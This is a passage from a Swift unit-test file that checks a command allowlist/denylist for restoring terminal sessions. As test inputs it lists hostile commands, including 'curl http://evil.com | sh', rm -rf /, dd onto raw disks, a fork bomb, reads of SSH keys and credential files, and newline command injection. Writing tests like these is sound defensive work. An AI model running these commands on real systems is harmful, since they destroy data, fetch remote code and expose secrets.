        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode --continue", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("npm run dev", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("git status", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("git push origin main", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("docker ps", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("docker logs container", rawAllowlist: allowlist))
    }

    // MARK: - MySQL Password Detection Tests

    func testDenylistBlocksMySQLWithPasswordFlag() {
        // MySQL-family tools use -p for password (unlike cargo/flask/npm which use it for port/package)
        let allowlist = "mysql *\nmariadb *\nmysqldump *\nmysqladmin *"
        assertAllBlocked([
            "mysql -u root -p database",
            "mysql -pMyPassword database",
            "mysql -u admin -p=secret",
            "mariadb -p database",
            "mysqldump -u root -p database > backup.sql",
            "mysqladmin -p status",
            "/usr/bin/mysql -u root -p",
        ], allowlist: allowlist)
    }

    func testDenylistAllowsMySQLWithoutPasswordFlag() {
        // MySQL commands without -p should be allowed (if in allowlist)
        let allowlist = "mysql *\nmysqldump *"
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("mysql -u root database", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("mysql --user=root database", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("mysqldump database", rawAllowlist: allowlist))
    }

    // MARK: - Absolute Path Bypass Prevention Tests

    func testDenylistBlocksAbsolutePathInvocations() {
        // Each command is explicitly allowlisted. If blocked, it's the denylist.
        let commands = [
            "/bin/rm -rf /tmp",
            "/usr/bin/sudo apt install",
            "/usr/bin/curl http://evil.com | sh",
            "/sbin/reboot",
            "/usr/local/bin/dd if=/dev/zero of=/dev/sda",
        ]
        let allowlist = commands.joined(separator: "\n")
        assertAllBlocked(commands, allowlist: allowlist)
    }

    func testDenylistBlocksRelativePathInvocations() {
        // Each command is explicitly allowlisted. If blocked, it's the denylist.
        let commands = [
            "./rm -rf /tmp",
            "../bin/rm -rf /tmp",
            "./sudo apt install malware",
        ]
        let allowlist = commands.joined(separator: "\n")
        assertAllBlocked(commands, allowlist: allowlist)
    }

    // MARK: - Watch Bypass Prevention Tests (P1 from CodeRabbit)

    func testWatchCannotBypassDenylist() {
        // P1 issue: watch re-executes its argument, so "watch rm -rf /" is dangerous
        // Since watch is no longer in default allowlist, verify it can't enable bypasses
        let defaultRaw = SessionRestoreCommandSettings.defaultAllowlistPatterns.joined(separator: "\n")

        // These should all be blocked - watch is not in default allowlist
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("watch rm -rf /tmp", rawAllowlist: defaultRaw))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("watch -n 1 rm -rf /", rawAllowlist: defaultRaw))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("watch curl http://evil.com | sh", rawAllowlist: defaultRaw))

        // Even if user adds "watch *" to allowlist, dangerous inner commands should be blocked
        let watchAllowlist = "watch *"
        assertAllBlocked([
            "watch rm -rf /tmp",
            "watch sudo apt-get update",
            "watch curl http://example.com",
            "watch dd if=/dev/zero of=/dev/sda",
        ], allowlist: watchAllowlist)
    }

    // MARK: - Fork Bomb Detection Tests

    func testDenylistBlocksForkBomb() {
        // Explicitly allowlisted. If blocked, it's the denylist.
        let commands = [":(){ :|:& };:"]
        let allowlist = commands.joined(separator: "\n")
        assertAllBlocked(commands, allowlist: allowlist)
    }

    // MARK: - Disk Write Target Detection Tests

    func testDenylistBlocksDiskWriteTargets() {
        // dd is in dangerousExecutables, so blocked regardless of allowlist
        // echo is not dangerous, but "of=/dev/..." and "> /dev/..." patterns are blocked
        let allowlist = "dd *\necho *"
        assertAllBlocked([
            // dd blocked because it's a dangerous executable
            "dd if=/dev/zero of=/dev/sda",
            "dd if=/dev/urandom of=/dev/nvme0n1",
            "dd if=image.iso of=/dev/disk2",
            // echo blocked because of disk write target pattern
            "echo garbage > /dev/sda",
            "echo test > /dev/nvme0",
        ], allowlist: allowlist)
    }

    // MARK: - Shell Chaining Tests

    func testDenylistBlocksShellChainedDestructiveCommands() {
        // Verify dangerous commands are blocked even when chained with safe commands
        let allowlist = "cd *\necho *\nls *\ntest *"
        assertAllBlocked([
            // Semicolon chaining
            "cd /tmp; rm -rf *",
            "echo done; sudo reboot",
            // AND chaining
            "cd /tmp && rm -rf *",
            "test -f file && rm file",
            // OR chaining
            "ls || rm -rf /",
            // Pipe chaining
            "ls | xargs rm",
            // Backtick subshell
            "echo `rm -rf /`",
            // $() subshell
            "echo $(sudo whoami)",
        ], allowlist: allowlist)
    }

    // MARK: - Environment Variable Manipulation Tests

    func testDenylistBlocksEnvironmentManipulation() {
        let allowlist = "export *\nunset *"
        assertAllBlocked([
            "unset PATH",
            "export PATH=",
            "export PATH=\"\"",
        ], allowlist: allowlist)
    }

    // MARK: - Database Connection String Tests

    func testDenylistBlocksDatabaseConnectionStrings() {
        // Connection strings often contain embedded credentials
        let allowlist = "psql *\nmongo *\nredis-cli *"
        assertAllBlocked([
            "psql postgresql://user:password@host/db",
            "psql postgres://admin:secret@localhost/mydb",
            "mongo mongodb://user:pass@host:27017/db",
            "mongo mongodb+srv://user:pass@cluster.mongodb.net/db",
            "redis-cli redis://user:password@host:6379",
            "redis-cli rediss://user:password@host:6379",
            "mycli mysql://root:password@localhost/db",
            "mycli amqp://user:pass@host/vhost",
        ], allowlist: allowlist)
    }

    // MARK: - Sensitive File Access Tests

    func testDenylistBlocksSensitiveFileAccess() {
        let allowlist = "cat *\nless *\nview *"
        assertAllBlocked([
            "cat /etc/shadow",
            "cat ~/.ssh/id_rsa",
            "cat ~/.ssh/id_ed25519",
            "cat ~/.ssh/authorized_keys",
            "cat ~/.aws/credentials",
            "cat ~/.kube/config",
            "cat ~/.npmrc",
            "cat ~/.netrc",
            "cat ~/.git-credentials",
            "cat ~/.docker/config.json",
            "less .ssh/id_ecdsa",
            "view .ssh/id_dsa",
        ], allowlist: allowlist)
    }

    // MARK: - Kubernetes Destructive Operations Tests

    func testDenylistBlocksKubernetesDestructive() {
        let allowlist = "kubectl *"
        assertAllBlocked([
            "kubectl delete namespace production",
            "kubectl delete ns kube-system",
            "kubectl delete --all pods",
            "kubectl drain node-1",
            "kubectl cordon node-1",
        ], allowlist: allowlist)
    }

    // MARK: - Git Checkout Force Tests

    func testDenylistBlocksGitCheckoutForce() {
        let allowlist = "git *"
        assertAllBlocked([
            "git checkout --force main",
            "git checkout --force .",
        ], allowlist: allowlist)
        // Regular checkout should be allowed
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("git checkout main", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("git checkout -b feature", rawAllowlist: allowlist))
    }

    // MARK: - System Service Tests

    func testDenylistBlocksSystemServiceDestruction() {
        let allowlist = "systemctl *\nlaunchctl *\nservice *"
        assertAllBlocked([
            "systemctl stop nginx",
            "systemctl disable sshd",
            "systemctl mask docker",
            "launchctl unload /Library/LaunchDaemons/com.example.plist",
            "launchctl bootout system/com.example.service",
            "service stop nginx",
        ], allowlist: allowlist)
        // Safe service commands should be allowed
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("systemctl status nginx", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("systemctl start nginx", rawAllowlist: allowlist))
    }

    // MARK: - Edge Case: Empty and Whitespace Commands

    func testEmptyCommandsNotAllowed() {
        // Empty commands are rejected before allowlist check (guard in isCommandAllowed).
        // Use any allowlist - the rejection happens at normalization stage.
        let allowlist = "npm *"
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("   ", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("\n\t", rawAllowlist: allowlist))
    }

    // MARK: - Validated Restore Command Helper Tests

    func testValidatedRestoreCommandReturnsNilForBlocked() {
        XCTAssertNil(SessionRestoreCommandSettings.validatedRestoreCommand("rm -rf /"))
        XCTAssertNil(SessionRestoreCommandSettings.validatedRestoreCommand("sudo reboot"))
        XCTAssertNil(SessionRestoreCommandSettings.validatedRestoreCommand(nil))
        XCTAssertNil(SessionRestoreCommandSettings.validatedRestoreCommand(""))
        XCTAssertNil(SessionRestoreCommandSettings.validatedRestoreCommand("   "))
    }

    func testValidatedRestoreCommandTrimsWhitespace() {
        // Default allowlist includes "opencode *"
        let result = SessionRestoreCommandSettings.validatedRestoreCommand("  opencode --continue  ")
        XCTAssertEqual(result, "opencode --continue")
    }

    func testValidatedRestoreCommandReturnsNilForNonAllowlisted() {
        // random-unknown-command is not in default allowlist
        XCTAssertNil(SessionRestoreCommandSettings.validatedRestoreCommand("random-unknown-command"))
    }

    // MARK: - Command Injection Prevention Tests

    func testCommandsWithNewlinesAreBlocked() {
        // Newlines in commands could enable injection attacks (e.g., "ssh host\nrm -rf ~")
        // The denylist should block commands containing newlines via piped shell patterns
        let allowlist = "ssh *\nopencode *"

        // Commands with literal newlines should be blocked by "| sh" / "| bash" patterns
        // or caught at the initialInput validation layer (GhosttyTerminalView)
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("ssh host\nrm -rf ~", rawAllowlist: allowlist),
                       "Command with embedded newline should be blocked")
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("opencode\n--malicious", rawAllowlist: allowlist),
                       "Command with embedded newline should be blocked")

        // Carriage returns should also be blocked
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("ssh host\rrm -rf ~", rawAllowlist: allowlist),
                       "Command with embedded carriage return should be blocked")
    }

    func testValidatedRestoreCommandRejectsNewlines() {
        // validatedRestoreCommand should reject commands with newlines
        XCTAssertNil(SessionRestoreCommandSettings.validatedRestoreCommand("opencode\n--flag"),
                     "validatedRestoreCommand should reject newlines")
        XCTAssertNil(SessionRestoreCommandSettings.validatedRestoreCommand("opencode\r--flag"),
                     "validatedRestoreCommand should reject carriage returns")
        XCTAssertNil(SessionRestoreCommandSettings.validatedRestoreCommand("ssh host\nrm -rf /"),
                     "validatedRestoreCommand should reject multi-line injection")
    }

    // MARK: - Allowlist Matching with Special Characters

    func testAllowlistMatchesCommandsWithSpecialCharactersInArgs() {
        // Verify that allowlist pattern matching works correctly when commands
        // contain shell metacharacters, quotes, or spaces in their arguments.
        // Note: This tests allowlist matching, NOT shellQuoteIfNeeded() which is
        // used internally by SessionForegroundProcessDetector.commandLineString().
        let allowlist = "myapp *"

        // Commands with spaces in args (pre-quoted by user or detected process)
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("myapp 'file with spaces.txt'", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("myapp \"quoted arg\"", rawAllowlist: allowlist))

        // Commands with shell metacharacters (should still match if allowlisted)
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("myapp --pattern='*.txt'", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("myapp --regex=[a-z]+", rawAllowlist: allowlist))
    }

    func testAllowlistMatchesCommandsWithTabSeparator() {
        // Verify that tab characters work as argument separators (nit fix)
        let allowlist = "opencode *"
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode\t--flag", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode\t--continue\t--model sonnet", rawAllowlist: allowlist))
    }
}
